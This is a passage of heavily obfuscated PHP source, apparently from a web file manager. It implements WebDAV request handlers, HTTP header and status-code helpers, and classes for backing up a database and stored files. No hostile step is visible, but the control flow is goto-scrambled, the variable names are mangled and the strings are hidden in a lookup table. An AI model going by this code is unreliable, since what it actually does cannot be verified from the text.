$eµà“°«¥ï[1196] => array($eµà“°«¥ï[1774], $eµà“°«¥ï[136], $eµà“°«¥ï[1775] . $BŠÁ¥˜Û¼‰[$eµà“°«¥ï[77]], $eµà“°«¥ï[1776] . get_file_mime($BŠÁ¥˜Û¼‰[$eµà“°«¥ï[157]]), $eµà“°«¥ï[132] . gmdate($eµà“°«¥ï[1762], $BŠÁ¥˜Û¼‰[$eµà“°«¥ï[1243]]) . $eµà“°«¥ï[1777], $eµà“°«¥ï[1778])); } public function httpOPTIONS() { $cùö”±Ÿ =& $_SERVER[¢à]; return array($cùö”±Ÿ[1028] => 200, $cùö”±Ÿ[1196] => array($cùö”±Ÿ[1779], $cùö”±Ÿ[1780], $cùö”±Ÿ[1781], $cùö”±Ÿ[1252])); } public function httpPROPPATCH() { $fŒßğÅ«Í­ =& $_SERVER[¢à]; $F¤‘Ş¥·­” = $fŒßğÅ«Í­[1782] . $_SERVER[$fŒßğÅ«Í­[1363]] . $fŒßğÅ«Í­[1783]; return array($fŒßğÅ«Í­[1770] => 207, $fŒßğÅ«Í­[1771] => "\x3c\x44\x3a\x6d\x75\154\164\151\163\x74\141\x74\165\x73\x20\x78\x6d\x6c\x6e\x73\72\x44\x3d\42\104\101\126\x3a\x22\76\12{$F¤‘Ş¥·­”}\xa\x3c\57\104\x3a\x6d\x75\154\x74\151\x73\x74\x61\164\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $c±ó×Áè™ =& $_SERVER[¢à]; $C­ƒëÇæÌæ = $this->uploadFile(); if ($C­ƒëÇæÌæ) { $FµÍï¯ó¥ = 204; } else { $C­ƒëÇæÌæ = $c±ó×Áè™[33]; $FµÍï¯ó¥ = 201; } $E›ˆïŒŒ°« = $this->pathPut($this->path, $C­ƒëÇæÌæ); if ($E›ˆïŒŒ°« == !1) { $FµÍï¯ó¥ = 404; } return array($c±ó×Áè™[1770] => $FµÍï¯ó¥); } private function uploadFile() { goto C„†¼¶¨ğ„; F…ïŒèê±À: while (!feof($e…„ºÀŒŠÈ)) { fwrite($Eº­šÔ¨”, fread($e…„ºÀŒŠÈ, 1024 * 200)); } fclose($e…„ºÀŒŠÈ); fclose($Eº­šÔ¨”); goto E¯ö¹Èš˜ª; C„†¼¶¨ğ„: $AÓ¿·¨•ïæ =& $_SERVER[¢à]; @mk_dir(TEMP_FILES); $B…ÛáÚéä¡ = TEMP_FILES . $AÓ¿·¨•ïæ[1784] . rand_string(32); goto døï…‡©æ×; E¯ö¹Èš˜ª: if (@filesize($B…ÛáÚéä¡) > 0) { return $B…ÛáÚéä¡; } @unlink($B…ÛáÚéä¡); return !1; goto dí‰Â¬ŸÈÄ; døï…‡©æ×: $Eº­šÔ¨” = @fopen($B…ÛáÚéä¡, $AÓ¿·¨•ïæ[1492]); $e…„ºÀŒŠÈ = @fopen($AÓ¿·¨•ïæ[1785], $AÓ¿·¨•ïæ[1491]); if (!$e…„ºÀŒŠÈ || !$Eº­šÔ¨”) { @unlink($B…ÛáÚéä¡); return !1; } goto F…ïŒèê±À; dí‰Â¬ŸÈÄ: } public function httpMKCOL() { $dÇÀÖÉÑŸÅ =& $_SERVER[¢à]; if ($this->pathExists($this->path)) { return array($dÇÀÖÉÑŸÅ[1028] => 409); } $dç‚öâ™œÕ = $this->pathMkdir($this->path); return array($dÇÀÖÉÑŸÅ[1028] => $dç‚öâ™œÕ ? 201 : 403); } public function httpMOVE() { $D¦ôï’àŠˆ =& $_SERVER[¢à]; $d›ˆ‡¸º¶ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$D¦ôï’àŠˆ[1786]])) { $eÈÖĞ®æŒÎ[$D¦ôï’àŠˆ[1787]] = $_SERVER[$D¦ôï’àŠˆ[1786]] == $D¦ôï’àŠˆ[1788]; } $E¡áÕâÍ÷ = $this->pathMove($this->path, $d›ˆ‡¸º¶); return array($D¦ôï’àŠˆ[1028] => $E¡áÕâÍ÷ ? 201 : 404); } public function httpCOPY() { $EÏ³Ó‰Ò®Æ = $this->parsePath($this->pathGet(!0)); $bµ—­Í·¢Ê = $this->pathCopy($this->path, $EÏ³Ó‰Ò®Æ); return array($_SERVER[¢à][1028] => $bµ—­Í·¢Ê ? 201 : 404); } public function httpDELETE() { $f†ŸĞÔçâÑ = $this->pathRemove($this->path); return array($_SERVER[¢à][1028] => $f†ŸĞÔçâÑ ? 200 : 503); } public function httpLOCK() { $FìÖ™¸¦î† =& $_SERVER[¢à]; $c‘¢‰ËÃÆê = md5($this->path); $eÏğœÚæšš = $FìÖ™¸¦î†[1789] . $this->xmlGet($FìÖ™¸¦î†[1790]) . $FìÖ™¸¦î†[1791] . $c‘¢‰ËÃÆê . $FìÖ™¸¦î†[1792]; return array($FìÖ™¸¦î†[1028] => 200, $FìÖ™¸¦î†[1196] => array($FìÖ™¸¦î†[1793] . $c‘¢‰ËÃÆê, $FìÖ™¸¦î†[1794]), $FìÖ™¸¦î†[1795] => $eÏğœÚæšš); } public function httpUNLOCK() { return array($_SERVER[¢à][1028] => 204); } public function xmlGet($AË“¾íæ½”) { goto AÍ‰³ò’‰; AÍ‰³ò’‰: $eœìÓÄâÙ =& $_SERVER[¢à]; static $eİŞ ‹Ç©ò = false; if (!$eİŞ ‹Ç©ò) { $FÂóİš¨ÏÏ = file_get_contents($eœìÓÄâÙ[1796]); $eİŞ ‹Ç©ò = new DOMDocument(); $eİŞ ‹Ç©ò->loadXML($FÂóİš¨ÏÏ); } goto FöÍ†Ùİš; FöÍ†Ùİš: $Aª¹£‹î = array_shift(explode($eœìÓÄâÙ[8], $AË“¾íæ½”)); $F„‰÷Çí†« = $eİŞ ‹Ç©ò->getElementsByTagNameNS($eœìÓÄâÙ[1797], $Aª¹£‹î); if ($F„‰÷Çí†«) { return $F„‰÷Çí†«[0]->nodeValue; } goto a÷î†¯•Íš; a÷î†¯•Íš: return $eœìÓÄâÙ[33]; goto DµùŠÀ¯Ê…; DµùŠÀ¯Ê…: } public static function response($d©ç¬ÔšÙè) { goto eÏêÛªãÅº; eÏêÛªãÅº: $FÉÜ°‘Ã¬Ÿ =& $_SERVER[¢à]; $bŒÛ¦‹ˆÑç = is_array($d©ç¬ÔšÙè[$FÉÜ°‘Ã¬Ÿ[1196]]) ? $d©ç¬ÔšÙè[$FÉÜ°‘Ã¬Ÿ[1196]] : array(); $bŒÛ¦‹ˆÑç[] = HttpHeader::code($d©ç¬ÔšÙè[$FÉÜ°‘Ã¬Ÿ[1028]]); goto E“‹ˆçã¥Æ; E­´ß‘ñ¢ï: if (is_string($d©ç¬ÔšÙè[$FÉÜ°‘Ã¬Ÿ[1795]])) { header($FÉÜ°‘Ã¬Ÿ[1798]); $F’á¤Ú‘õÄ = $FÉÜ°‘Ã¬Ÿ[1799] . $FÉÜ°‘Ã¬Ÿ[214] . $d©ç¬ÔšÙè[$FÉÜ°‘Ã¬Ÿ[1795]]; echo $F’á¤Ú‘õÄ; } goto d‘¼ùé¤; E“‹ˆçã¥Æ: $bŒÛ¦‹ˆÑç[] = $FÉÜ°‘Ã¬Ÿ[1737]; $bŒÛ¦‹ˆÑç[] = $FÉÜ°‘Ã¬Ÿ[1738]; foreach ($bŒÛ¦‹ˆÑç as $D²ÅÆÁ‘ÆÉ) { header($D²ÅÆÁ‘ÆÉ); } goto E­´ß‘ñ¢ï; d‘¼ùé¤: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\x48\124\124\x50\x5f\x48\117\x53\x54", "\125\163\145\162\x2d\101\147\x65\x6e\164" => "\110\x54\124\x50\137\x55\x53\x45\122\x5f\101\x47\x45\116\124", "\103\157\156\x74\x65\156\x74\55\124\x79\x70\x65" => "\110\124\124\x50\137\103\x4f\116\124\x45\116\x54\x5f\124\x59\x50\105", "\x43\157\x6e\x74\x65\156\164\x2d\x4c\145\156\x67\164\x68" => "\110\124\124\x50\137\103\x4f\x4e\124\x45\116\124\137\114\x45\x4e\107\124\110", "\x44\x65\x70\164\x68" => "\x48\x54\124\x50\137\104\105\x50\x54\110", "\105\x78\x70\x65\143\x74" => "\x48\124\124\120\137\105\130\120\x45\x43\x54", "\111\146\55\116\x6f\x6e\145\x2d\115\x61\x74\x63\x68" => "\x48\124\124\x50\x5f\x49\x46\137\x4e\117\116\x45\x5f\x4d\101\x54\103\110", "\111\146\x2d\x4d\x61\164\143\x68" => "\110\124\x54\120\137\x49\106\x5f\x4d\x41\x54\103\110", "\x49\146\55\122\141\156\147\x65" => "\110\124\124\x50\137\x49\x46\x5f\122\x41\116\107\x45", "\x4c\141\163\164\x2d\115\157\144\x69\146\151\145\x64" => "\110\x54\124\x50\x5f\x4c\101\x53\124\137\x4d\117\x44\x49\106\111\105\104", "\x49\146\x2d\x4d\x6f\x64\x69\146\x69\x65\144\x2d\123\x69\x6e\x63\x65" => "\x48\x54\124\120\137\111\x46\x5f\x4d\x4f\x44\x49\x46\111\105\104\137\x53\x49\116\x43\105", "\x49\146\x2d\125\156\155\x6f\144\151\x66\x69\x65\144\55\123\x69\x6e\x63\145" => "\x48\x54\x54\120\x5f\x49\106\x5f\x55\x4e\115\117\104\111\x46\111\105\x44\x5f\123\x49\116\x43\x45", "\x52\x61\156\x67\145" => "\x48\x54\124\x50\x5f\122\101\x4e\x47\105", "\x54\x69\x6d\x65\157\165\164" => "\110\x54\x54\x50\x5f\x54\x49\x4d\105\x4f\125\124", "\x49\x66" => "\x48\124\124\120\x5f\x49\x46", "\114\157\x63\x6b\x2d\x54\157\153\x65\156" => "\110\x54\124\120\x5f\114\x4f\x43\x4b\x5f\124\117\x4b\x45\116", "\x4f\x76\145\x72\167\162\151\x74\x65" => "\110\124\124\120\x5f\117\126\105\122\x57\122\x49\124\x45", "\x44\x65\163\164\151\156\x61\x74\x69\157\x6e" => "\110\124\124\120\137\104\x45\123\x54\x49\x4e\101\x54\111\x4f\116", "\x52\x65\x71\x75\x65\163\164\55\x49\144" => "\x52\x45\x51\125\x45\x53\x54\x5f\x49\104", "\122\145\x71\x75\x65\x73\164\55\x42\157\144\x79\x2d\x46\151\x6c\x65" => "\x52\105\121\125\x45\x53\124\137\102\x4f\x44\131\x5f\x46\111\x4c\105", "\122\x65\x64\x69\162\x65\x63\x74\55\123\x74\x61\x74\x75\x73" => "\x52\105\104\x49\122\105\103\124\x5f\123\124\101\124\125\x53"); public static function init() { static $D‡ÄÇƒÏ‹ = false; if ($D‡ÄÇƒÏ‹) { return; } foreach ($_SERVER as $fàº¶Óğ§ => $C¤÷·ê•†) { $fàº¶Óğ§ = strtoupper($fàº¶Óğ§); if (!array_key_exists($fàº¶Óğ§, $_SERVER)) { continue; } $_SERVER[$fàº¶Óğ§] = $C¤÷·ê•†; } foreach (self::$_headers as $fàº¶Óğ§ => $A×¥ÚÚŠÌÃ) { if (!array_key_exists($fàº¶Óğ§, $_SERVER)) { continue; } $_SERVER[$fàº¶Óğ§] = $_SERVER[$A×¥ÚÚŠÌÃ]; $_SERVER[strtoupper($fàº¶Óğ§)] = $_SERVER[$A×¥ÚÚŠÌÃ]; } } public static function get($CºÓÆÛ×ñ‹) { self::init(); return $_SERVER[$CºÓÆÛ×ñ‹] ? $_SERVER[$CºÓÆÛ×ñ‹] : $_SERVER[$_SERVER[¢à][1800] . strtoupper($CºÓÆÛ×ñ‹)]; } public static function method() { return strtoupper(self::get($_SERVER[¢à][151])); } public static function length() { $bÏ±æ«ƒî™ =& $_SERVER[¢à]; $eºã„ãÁ†ø = self::get($bÏ±æ«ƒî™[1801]); if (!$eºã„ãÁ†ø) { $eºã„ãÁ†ø = self::get($bÏ±æ«ƒî™[1135]); } return $eºã„ãÁ†ø; } public static function range() { $Aèò¿Ö²Ë =& $_SERVER[¢à]; $A‰š•â°™ = self::get($Aèò¿Ö²Ë[195]); if (!$A‰š•â°™) { return !1; } if (!preg_match($Aèò¿Ö²Ë[1802], $A‰š•â°™, $c×¨›×“Ìğ)) { return !1; } if ($c×¨›×“Ìğ[1] === $Aèò¿Ö²Ë[33] && $c×¨›×“Ìğ[2] === $Aèò¿Ö²Ë[33]) { return !1; } return array($c×¨›×“Ìğ[1] !== $Aèò¿Ö²Ë[33] ? $c×¨›×“Ìğ[1] : null, $c×¨›×“Ìğ[2] !== $Aèò¿Ö²Ë[33] ? $c×¨›×“Ìğ[2] : null); } public static $statusCode = array("\x31\x30\60" => "\x43\x6f\x6e\164\151\x6e\x75\x65", "\x31\60\x31" => "\123\167\151\x74\x63\150\151\x6e\x67\x20\120\162\157\x74\157\143\157\154", "\x31\60\x32" => "\x50\x72\157\x63\x65\163\163\151\x6e\x67", "\61\x30\x33" => "\105\141\x72\154\x79\40\110\x69\156\x74\163", "\x32\60\x30" => "\117\x4b", "\62\x30\x31" => "\x43\162\145\x61\x74\x65\x64", "\62\x30\x32" => "\x41\x63\x63\x65\x70\164\145\x64", "\x32\60\63" => "\116\157\x6e\55\x41\165\x74\150\157\162\151\x74\141\164\151\166\x65\40\x49\x6e\x66\157\162\155\x61\164\x69\157\156", "\62\x30\x34" => "\x4e\x6f\40\103\157\x6e\x74\145\156\x74", "\x32\x30\x35" => "\x52\x65\163\x65\164\40\x43\157\x6e\164\145\156\164", "\x32\60\66" => "\120\x61\x72\x74\x69\x61\154\x20\x43\157\x6e\164\x65\156\164", "\x32\x30\67" => "\x4d\165\x6c\x74\151\x2d\x53\164\141\x74\x75\x73", "\63\x30\x30" => "\x4d\165\154\x74\x69\x70\x6c\145\x20\x43\x68\x6f\x69\x63\x65\x73", "\63\60\61" => "\115\x6f\x76\x65\144\x20\x50\145\162\155\x61\156\x65\x6e\164\154\171", "\63\x30\62" => "\x46\x6f\x75\156\x64", "\63\60\63" => "\123\x65\x65\40\117\164\150\x65\162", "\x33\x30\x34" => "\x4e\157\x74\40\115\157\144\151\146\151\145\144", "\63\x30\65" => "\x55\163\x65\x20\x50\x72\157\170\x79", "\x33\x30\67" => "\124\145\155\x70\157\162\x61\162\171\x20\122\x65\x64\x69\x72\145\x63\x74", "\63\x30\70" => "\x50\x65\162\x6d\141\156\145\x6e\164\x20\x52\145\x64\151\162\x65\143\164", "\x34\x30\60" => "\102\x61\144\x20\122\x65\x71\x75\x65\163\x74", "\x34\x30\x31" => "\125\x6e\141\165\164\150\157\162\x69\x7a\145\x64", "\64\60\x32" => "\x50\141\x79\155\x65\156\x74\x20\x52\x65\161\x75\151\162\x65\x64", "\x34\60\x33" => "\x46\157\x72\142\151\x64\x64\x65\156", "\x34\x30\64" => "\x4e\x6f\164\40\106\157\165\x6e\144", "\x34\60\x35" => "\x4d\145\x74\150\157\x64\x20\116\157\164\40\x41\x6c\x6c\157\167\145\144", "\64\x30\66" => "\x4e\157\164\x20\x41\143\143\x65\160\x74\x61\x62\x6c\x65", "\x34\60\67" => "\120\x72\x6f\170\171\40\x41\165\164\x68\145\x6e\x74\x69\143\x61\x74\x69\157\x6e\40\x52\x65\x71\165\x69\162\145\144", "\x34\x30\70" => "\x52\145\x71\165\145\x73\164\40\x54\x69\155\145\x6f\x75\x74", "\64\60\71" => "\103\x6f\156\146\154\x69\x63\x74", "\x34\x31\60" => "\107\157\156\145", "\64\61\61" => "\114\x65\x6e\x67\164\150\40\x52\x65\161\165\151\162\x65\x64", "\x34\61\62" => "\120\x72\145\x63\x6f\x6e\144\x69\164\151\157\156\x20\x46\x61\x69\x6c\145\144", "\x34\61\x33" => "\x52\145\x71\x75\x65\163\x74\40\x45\156\x74\151\164\x79\x20\x54\x6f\157\x20\114\x61\x72\147\x65", "\x34\61\x34" => "\122\145\161\x75\x65\x73\x74\40\125\122\111\x20\124\157\157\x20\114\x61\162\x67\145", "\64\61\65" => "\125\x6e\163\x75\x70\160\157\162\164\x65\144\x20\x4d\145\144\x69\141\40\x54\x79\160\145", "\64\61\66" => "\x52\x65\161\165\145\x73\164\x65\x64\x20\122\x61\x6e\147\145\x20\116\x6f\x74\40\123\141\x74\x69\163\x66\x69\141\142\154\145", "\64\x31\67" => "\105\x78\x70\145\143\x74\141\164\x69\x6f\156\x20\x46\141\x69\x6c\145\144", "\64\x32\62" => "\125\x6e\x70\162\157\x63\x65\163\x73\x61\x62\x6c\x65\x20\105\156\164\151\x74\171", "\x34\62\63" => "\x4c\x6f\143\153\x65\144", "\64\x32\64" => "\x46\x61\x69\x6c\x65\x64\x20\x44\x65\160\x65\156\x64\x65\x6e\x63\x79", "\64\x32\65" => "\x55\156\157\x72\144\145\162\145\x64\x20\103\x6f\x6c\x6c\x65\x63\164\151\x6f\156", "\x34\62\x36" => "\125\160\147\162\x61\x64\145\x20\x52\x65\x71\165\151\162\x65\x64", "\64\62\70" => "\120\162\145\x63\x6f\156\144\x69\x74\x69\157\156\x20\x52\x65\x71\x75\151\x72\145\x64", "\64\x32\71" => "\124\157\x6f\40\115\x61\x6e\x79\40\x52\145\x71\x75\145\x73\x74\163", "\64\63\x31" => "\122\x65\x71\x75\145\x73\x74\x20\x48\145\x61\144\145\x72\x20\106\x69\145\x6c\144\x73\x20\x54\x6f\x6f\40\114\141\x72\147\145", "\64\x34\64" => "\x4e\157\40\x52\x65\x73\160\157\156\x73\145", "\x34\x35\x30" => "\x42\x6c\x6f\x63\153\x65\x64\x20\142\x79\x20\x57\151\x6e\144\157\167\163\x20\120\x61\x72\145\156\164\141\x6c\40\x43\x6f\x6e\x74\162\x6f\154\163", "\x34\65\x31" => "\125\156\x61\166\x61\x69\154\x61\142\x6c\x65\40\106\157\x72\x20\114\145\147\x61\x6c\40\x52\145\141\x73\x6f\156\163", "\x34\x39\64" => "\x52\x65\161\165\145\163\164\40\110\145\141\x64\145\x72\40\124\157\157\40\x4c\141\x72\x67\x65", "\65\x30\60" => "\x49\x6e\164\145\162\x6e\141\154\x20\x53\145\162\x76\x65\162\x20\105\x72\x72\x6f\x72", "\x35\x30\61" => "\x4e\157\x74\40\111\x6d\160\154\x65\x6d\145\156\x74\x65\144", "\65\x30\62" => "\102\141\x64\40\107\x61\164\145\x77\x61\x79", "\x35\x30\63" => "\x53\145\x72\166\x69\143\145\40\125\x6e\141\x76\x61\x69\154\x61\142\154\x65", "\65\x30\64" => "\107\141\x74\145\x77\141\x79\40\124\x69\155\x65\157\165\164", "\65\60\65" => "\x48\124\x54\x50\40\126\x65\x72\x73\x69\x6f\156\x20\x6e\x6f\164\x20\163\x75\160\x70\157\x72\164\x65\144", "\65\60\x37" => "\x49\156\163\x75\x66\146\151\143\151\145\156\164\40\x53\164\157\162\x61\x67\145"); public static function code($eÁ¿›¿Ê—Š) { $bĞ—‘ ©Ş§ =& $_SERVER[¢à]; $eÁ¿›¿Ê—Š = $eÁ¿›¿Ê—Š . $bĞ—‘ ©Ş§[33]; $FÍâÚÆÇÂ— = self::$statusCode[$eÁ¿›¿Ê—Š]; $FÍâÚÆÇÂ— = $FÍâÚÆÇÂ— ? "\110\124\x54\x50\x2f\x31\56\x31\40{$eÁ¿›¿Ê—Š}\40" . $FÍâÚÆÇÂ— : $bĞ—‘ ©Ş§[33]; return $FÍâÚÆÇÂ—; } } goto AóÍ¸ìãøÇ; Aî¼“ôß®: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto BòŸİ©½Ï; dèèîõ¸ŒŒ: $DÍ§à‰†äØ = new DbManage($fÒãßîê‰¬, $cÜÙº¸¡—Ğ); $E‡Ù´«áß¢ = TEMP_FILES . $dŠëƒ¡ô³œ[710] . self::$name . $dŠëƒ¡ô³œ[8]; del_dir($E‡Ù´«áß¢); goto C±®Šˆ‹¡; D½¬•‘±Ú: return !0; goto B¶ª»­‰†Î; BòŸİ©½Ï: $dŠëƒ¡ô³œ =& $_SERVER[¢à]; $AáºáÙ¾“À = Backup::get(); self::$io = $AáºáÙ¾“À[$dŠëƒ¡ô³œ[691]]; goto eÈíÁùÀ›Ü; eä»¬Ê‰®†: $aªãàÂŞÓŒ = new Task($dŠëƒ¡ô³œ[711], $dŠëƒ¡ô³œ[712], 0, LNG($dŠëƒ¡ô³œ[713]) . $dŠëƒ¡ô³œ[714] . LNG($dŠëƒ¡ô³œ[715])); $d³ÑŒ¼Õİí = array_diff($d³ÑŒ¼Õİí, array($dŠëƒ¡ô³œ[716], $dŠëƒ¡ô³œ[717])); foreach ($d³ÑŒ¼Õİí as $d¶±»Ñ–Ğó) { $F¹¼­Ñ¢±ó = $E‡Ù´«áß¢ . $d¶±»Ñ–Ğó . $dŠëƒ¡ô³œ[718]; $Dï¿ŒÓÁŠ = null; if ($d¶±»Ñ–Ğó == $dŠëƒ¡ô³œ[719] && (!isset($AáºáÙ¾“À[$dŠëƒ¡ô³œ[692]]) || $AáºáÙ¾“À[$dŠëƒ¡ô³œ[692]] == $dŠëƒ¡ô³œ[464])) { $Dï¿ŒÓÁŠ = self::$io; } $f‹•œ˜£¨œ += $DÍ§à‰†äØ->sqlFromDb($d¶±»Ñ–Ğó, $F¹¼­Ñ¢±ó, $aªãàÂŞÓŒ, $Dï¿ŒÓÁŠ); } goto b…ÃÔÚêŒ; C±®Šˆ‹¡: mk_dir($E‡Ù´«áß¢); $d³ÑŒ¼Õİí = $DÍ§à‰†äØ->db()->getTables(); $f‹•œ˜£¨œ = 0; goto eä»¬Ê‰®†; eÈíÁùÀ›Ü: self::$name = $AáºáÙ¾“À[$dŠëƒ¡ô³œ[28]]; $fÒãßîê‰¬ = $GLOBALS[$dŠëƒ¡ô³œ[6]][$dŠëƒ¡ô³œ[17]]; $cÜÙº¸¡—Ğ = $this->_dbType($fÒãßîê‰¬); goto dèèîõ¸ŒŒ; b…ÃÔÚêŒ: $aªãàÂŞÓŒ->end(); $dãõØ‘Ù¾Î = array($dŠëƒ¡ô³œ[720] => $cÜÙº¸¡—Ğ, $dŠëƒ¡ô³œ[707] => 1, $dŠëƒ¡ô³œ[721] => $f‹•œ˜£¨œ, $dŠëƒ¡ô³œ[722] => $f‹•œ˜£¨œ); Backup::set($dãõØ‘Ù¾Î); goto D½¬•‘±Ú; B¶ª»­‰†Î: } private function _dbType($bÁÏí­·•Ù) { $Bò®Ä£î…ñ =& $_SERVER[¢à]; $AÖ…ÓÈòŞº = $bÁÏí­·•Ù[$Bò®Ä£î…ñ[723]]; if ($AÖ…ÓÈòŞº == $Bò®Ä£î…ñ[724]) { $E£è×¤·ğ… = explode($Bò®Ä£î…ñ[4], $bÁÏí­·•Ù[$Bò®Ä£î…ñ[725]]); $AÖ…ÓÈòŞº = $E£è×¤·ğ…[0]; } $FÛ¦À»›İ› = array($Bò®Ä£î…ñ[726] => $Bò®Ä£î…ñ[9], $Bò®Ä£î…ñ[727] => $Bò®Ä£î…ñ[728]); if (isset($FÛ¦À»›İ›[$AÖ…ÓÈòŞº])) { $AÖ…ÓÈòŞº = $FÛ¦À»›İ›[$AÖ…ÓÈòŞº]; } return $AÖ…ÓÈòŞº; } } class BackupDbFile { public function __construct() { } public function index() { goto a³·µØÌ; cƒáêÖô¯ª: Backup::set(array($DÁ¯ÕÖÄ[731] => $c«Ï®”Ïõ[$DÁ¯ÕÖÄ[77]])); IO::move($DÑÔéùæŞ, $B‘÷ „ÍÚ); $Aµ–ºƒŒö = CONTROLLER_DIR . $DÁ¯ÕÖÄ[732]; goto dÎ¢Ó¥§†Î; Bãõ¼›Öõø: $DÑÔéùæŞ = TEMP_FILES . "\x62\x61\x63\x6b\165\160\137{$d—Œˆ‘ºÈÎ}\x2f"; $B‘÷ „ÍÚ = "\x7b\x69\x6f\x3a{$d›ˆÂÎÍ§µ[$DÁ¯ÕÖÄ[691]]}\x7d\x2f\x64\x61\x74\141\x62\141\163\145\x2f"; IO::mkdir($B‘÷ „ÍÚ . "\x62\141\143\153\x75\160\137{$d—Œˆ‘ºÈÎ}\x2f"); goto Dğ¥â£Èä¢; dÎ¢Ó¥§†Î: IO::copy($Aµ–ºƒŒö, $B‘÷ „ÍÚ . "\142\141\x63\153\165\160\x5f{$d—Œˆ‘ºÈÎ}\57"); $EÇÈ–¤¡Â->end(); Backup::set(array($DÁ¯ÕÖÄ[733] => $c«Ï®”Ïõ[$DÁ¯ÕÖÄ[77]])); goto B¼±õÍä°á; B¼±õÍä°á: return !0; goto eÂëÓÓÍé°; Dğ¥â£Èä¢: $EÇÈ–¤¡Â = new TaskFileTransfer($DÁ¯ÕÖÄ[729], $DÁ¯ÕÖÄ[712], 0, LNG($DÁ¯ÕÖÄ[713]) . $DÁ¯ÕÖÄ[408] . LNG($DÁ¯ÕÖÄ[715]) . $DÁ¯ÕÖÄ[730]); $EÇÈ–¤¡Â->addPath($DÑÔéùæŞ); $c«Ï®”Ïõ = IO::infoWithChildren($DÑÔéùæŞ); goto cƒáêÖô¯ª; a³·µØÌ: $DÁ¯ÕÖÄ =& $_SERVER[¢à]; $d›ˆÂÎÍ§µ = Backup::get(); $d—Œˆ‘ºÈÎ = $d›ˆÂÎÍ§µ[$DÁ¯ÕÖÄ[28]]; goto Bãõ¼›Öõø; eÂëÓÓÍé°: } } class BackupFile { public function __construct() { } public function index() { goto C‚‘áÄ´ˆİ; a—‰…ŒÊ: $D‹§îëÀÔ§ = (int) Model($_SERVER[¢à][719])->where($e¨øÚôÕ©í)->count($_SERVER[¢à][415]); $A÷¡ÄŞØ“Ù = (int) Model($_SERVER[¢à][719])->where($e¨øÚôÕ©í)->sum($_SERVER[¢à][77]); $AĞŸõ = new TaskFileTransfer($_SERVER[¢à][736], $_SERVER[¢à][712], $D‹§îëÀÔ§, LNG($_SERVER[¢à][713]) . $_SERVER[¢à][714] . LNG($_SERVER[¢à][737])); goto FØÃ«ˆ‡Ã; D“‚ Ûâ×ß: $bÎ×À„±ê¤ = $BÎ…˜³ì‘ = 0; do { $Dî’†ï«¥ = $_SERVER[¢à][740]; $f‡É­¸Ûô› = Model($_SERVER[¢à][719])->where($e¨øÚôÕ©í)->field($Dî’†ï«¥)->order($_SERVER[¢à][741])->selectPage($dÚ“ß²¼˜¶, $a«ÌÉÔºõˆ); $AƒË±Õ‰Ê© = !empty($f‡É­¸Ûô›[$_SERVER[¢à][351]]) ? $f‡É­¸Ûô›[$_SERVER[¢à][351]] : array(); foreach ($AƒË±Õ‰Ê© as $BéµœÈœªö) { goto E±²à‹õ±Ù; fñ¡ôáÑ©¼: if ($a¡»™ÏœßÕ >= 1024 * 1024 * 100) { $d‹ƒï„–¸í = array($_SERVER[¢à][747] => $b ËêÖ¸ƒ, $_SERVER[¢à][748] => $BÎ…˜³ì‘, $_SERVER[¢à][749] => $bÎ×À„±ê¤); Backup::set($d‹ƒï„–¸í); $a¡»™ÏœßÕ = $D’ £ª‡Š  = 0; } goto f‚“ª‰«ÒÉ; aø¦½ªÒÓ: $a¡»™ÏœßÕ += $BéµœÈœªö[$_SERVER[¢à][77]]; $BÎ…˜³ì‘ += 1; $bÎ×À„±ê¤ += $BéµœÈœªö[$_SERVER[¢à][77]]; goto fñ¡ôáÑ©¼; Dîß´˜ØÕ•: if (IO::exist($b³å—Ê‰Ó³)) { $AĞŸõ->updateFileEnd($BéµœÈœªö[$_SERVER[¢à][28]], $BéµœÈœªö[$_SERVER[¢à][77]]); } else { $b³å—Ê‰Ó³ = get_path_father($b³å—Ê‰Ó³); IO::mkdir($b³å—Ê‰Ó³); if (!IO::copy($Bã¼‘‚†›, $b³å—Ê‰Ó³, $_SERVER[¢à][744])) { write_log($_SERVER[¢à][745] . $Bã¼‘‚†› . $_SERVER[¢à][746] . $b³å—Ê‰Ó³ . $_SERVER[¢à][472], $_SERVER[¢à][712]); $b„¯¿ÃîÑÕ = !1; break; } } $b ËêÖ¸ƒ = $BéµœÈœªö[$_SERVER[¢à][415]]; $D’ £ª‡Š  += 1; goto aø¦½ªÒÓ; E±²à‹õ±Ù: if (!$this->_fileExist($BéµœÈœªö, $f”Ë¦²ÛĞ‚, $CÒŠ„¹°¸Ï)) { $D‹§îëÀÔ§ -= 1; $A÷¡ÄŞØ“Ù -= (int) $BéµœÈœªö[$_SERVER[¢à][77]]; write_log("\146\x69\154\145\40\x6e\157\164\x20\145\x78\x69\163\164\x2e\146\x69\x6c\x65\111\x44\x3a{$BéµœÈœªö[$_SERVER[¢à][415]]}\54\40\160\141\164\150\x3a{$BéµœÈœªö[$_SERVER[¢à][75]]}", $_SERVER[¢à][742]); continue; } $Bã¼‘‚†› = $BéµœÈœªö[$_SERVER[¢à][75]]; $b³å—Ê‰Ó³ = "\x7b\151\x6f\72{$AË ¼â ã£[$_SERVER[¢à][691]]}\175" . substr($Bã¼‘‚†›, strlen("\173\x69\157\72{$BéµœÈœªö[$_SERVER[¢à][743]]}\175")); goto Dîß´˜ØÕ•; f‚“ª‰«ÒÉ: } $d…†£Ù‹³Ç = count($AƒË±Õ‰Ê©); $a«ÌÉÔºõˆ++; } while ($d…†£Ù‹³Ç == $dÚ“ß²¼˜¶); $AĞŸõ->end(); goto e¢ °‡²èÈ; C¯Œ¿Úæ¡ˆ: Backup::set($d‹ƒï„–¸í); $this->_fileFilter($f”Ë¦²ÛĞ‚); return !0; goto Dì„„ñÆ¾‰; aÈ¥‹íŠë–: $dÚ“ß²¼˜¶ = 1000; $a¡»™ÏœßÕ = $D’ £ª‡Š  = 0; $f”Ë¦²ÛĞ‚ = array(); goto D“‚ Ûâ×ß; FØÃ«ˆ‡Ã: $AĞŸõ->task[$_SERVER[¢à][698]] = $A÷¡ÄŞØ“Ù; $d‹ƒï„–¸í = array($_SERVER[¢à][738] => $D‹§îëÀÔ§, $_SERVER[¢à][739] => $A÷¡ÄŞØ“Ù); Backup::set($d‹ƒï„–¸í); goto CÆÓéœ; CÆÓéœ: $b„¯¿ÃîÑÕ = !0; $CÒŠ„¹°¸Ï = $this->storeIds(); $a«ÌÉÔºõˆ = 1; goto aÈ¥‹íŠë–; C‚‘áÄ´ˆİ: $AË ¼â ã£ = 